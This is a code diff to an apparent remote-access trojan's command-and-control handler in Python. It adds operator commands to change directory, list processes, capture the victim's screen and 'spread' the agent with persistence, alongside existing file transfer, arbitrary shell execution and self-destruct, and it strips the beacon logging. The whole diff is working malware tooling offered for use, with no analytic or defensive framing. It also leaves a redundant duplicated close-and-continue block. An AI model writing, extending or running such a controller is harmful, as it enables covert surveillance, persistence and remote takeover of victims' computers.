@@ -2,6 +2,7 @@ import base64
 import os
 import socket
 import threading
+import time
 
 from modules.crypto import encrypt, decrypt
 
@@ -75,11 +76,10 @@ class Handler:
                         if not c:
                             raise ConnectionError("disconnected")
                         enc += c
-                    print(f" {_colorize('[*]', B)} Beacon from {addr[0]}: {plen} bytes encrypted")
                     decrypt(self.key, enc)
-                    print(f" {_colorize('[*]', G)} Beacon decrypted OK")
-                except Exception as e:
-                    print(f" {_colorize('[!]', R)} Beacon decrypt failed from {addr[0]}: {e}")
+                except Exception:
+                    client.close()
+                    continue
                     client.close()
                     continue
 
@@ -226,14 +226,18 @@ class Handler:
                 if cmd == "help":
                     print()
                     print(f" {_colorize('Commands:', S)}")
-                    print(f"   {_colorize('help', C)}        Show this help")
-                    print(f"   {_colorize('back', C)}        Return to handler")
-                    print(f"   {_colorize('ping', C)}        Check if agent is alive")
-                    print(f"   {_colorize('info', C)}        Show agent information")
-                    print(f"   {_colorize('download <path>', C)}  Download file from agent")
-                    print(f"   {_colorize('upload <local> [remote]', C)}  Upload file to agent")
+                    print(f"   {_colorize('help', C)}          Show this help")
+                    print(f"   {_colorize('back', C)}          Return to handler")
+                    print(f"   {_colorize('ping', C)}          Check if agent is alive")
+                    print(f"   {_colorize('info', C)}          Show agent information")
+                    print(f"   {_colorize('cd <path>', C)}     Change working directory")
+                    print(f"   {_colorize('ps', C)}            List processes")
+                    print(f"   {_colorize('screenshot', C)}    Capture screen")
+                    print(f"   {_colorize('spread', C)}        Copy to system + persist")
+                    print(f"   {_colorize('download <p>', C)}  Download file from agent")
+                    print(f"   {_colorize('upload <l> [r]', C)}  Upload file to agent")
                     print(f"   {_colorize('selfdestruct', C)}  Remove agent from system")
-                    print(f"   {_colorize('<command>', C)}    Execute any shell command")
+                    print(f"   {_colorize('<command>', C)}      Execute any shell command")
                     print()
                     continue
                 if cmd == "ping":
@@ -281,6 +285,20 @@ class Handler:
                         remote = parts[1] if len(parts) > 1 else None
                         self.upload_file(sid, local, remote)
                     continue
+                if cmd.startswith("cd "):
+                    path = cmd[3:].strip()
+                    if not path:
+                        print(f" {_colorize('[!]', Y)} Usage: cd <path>")
+                    else:
+                        result = self.send_command(sid, f"__cd__|{path}")
+                        if result and not result.startswith("__error__"):
+                            print(f" {_colorize('[*]', B)} Changed to: "
+                                  f"{_colorize(result, C)}")
+                        elif result:
+                            print(f" {_colorize('[!]', R)} {result[9:]}")
+                        else:
+                            print(f" {_colorize('[!]', R)} Session {sid} disconnected")
+                    continue
                 if cmd == "selfdestruct":
                     confirm = input(
                         f" {_colorize('[!]', R)} This will destroy the agent. "
@@ -289,16 +307,53 @@ class Handler:
                     if confirm.lower() == "y":
                         result = self.send_command(sid, "__selfdestruct__")
                         if result and "__ok__" in result:
-                            print(
-                                f" {_colorize('[+]', G)} Agent "
-                                f"{_colorize('self-destructed', R)}"
-                            )
+                            print(f" {_colorize('[+]', G)} Agent "
+                                  f"{_colorize('self-destructed', R)}")
                         else:
                             print(f" {_colorize('[!]', R)} Self-destruct failed")
                         break
                     continue
+                if cmd == "ps":
+                    result = self.send_command(sid, "__ps__")
+                    if result and not result.startswith("__error__"):
+                        print(result)
+                    elif result:
+                        print(f" {_colorize('[!]', R)} {result[9:]}")
+                    else:
+                        print(f" {_colorize('[!]', R)} Session {sid} disconnected")
+                    continue
+                if cmd == "screenshot":
+                    print(f" {_colorize('[*]', B)} Capturing screenshot...")
+                    result = self.send_command(sid, "__screenshot__")
+                    if result and not result.startswith("__error__"):
+                        try:
+                            data = base64.b64decode(result)
+                            fname = f"screenshot_{sid}_{int(time.time())}.png"
+                            with open(fname, "wb") as f:
+                                f.write(data)
+                            print(f" {_colorize('[+]', G)} Saved: "
+                                  f"{_colorize(fname, C)} "
+                                  f"({_colorize(f'{len(data)} bytes', Y)})")
+                        except Exception as e:
+                            print(f" {_colorize('[!]', R)} Failed to save: {e}")
+                    elif result:
+                        print(f" {_colorize('[!]', R)} {result[9:]}")
+                    else:
+                        print(f" {_colorize('[!]', R)} Session {sid} disconnected")
+                    continue
+                if cmd == "spread":
+                    result = self.send_command(sid, "__spread__")
+                    if result and result.startswith("__ok__|"):
+                        parts = result[6:].split("|")
+                        print(f" {_colorize('[+]', G)} Spread to:")
+                        for p in parts:
+                            print(f"     {_colorize(p, C)}")
+                    elif result:
+                        print(f" {_colorize('[!]', R)} {result[9:]}")
+                    else:
+                        print(f" {_colorize('[!]', R)} Session {sid} disconnected")
+                    continue
 
-                # Any other command -> send raw to agent
                 result = self.send_command(sid, cmd)
                 if result is None:
                     print(f" {_colorize('[!]', R)} Session {sid} disconnected")
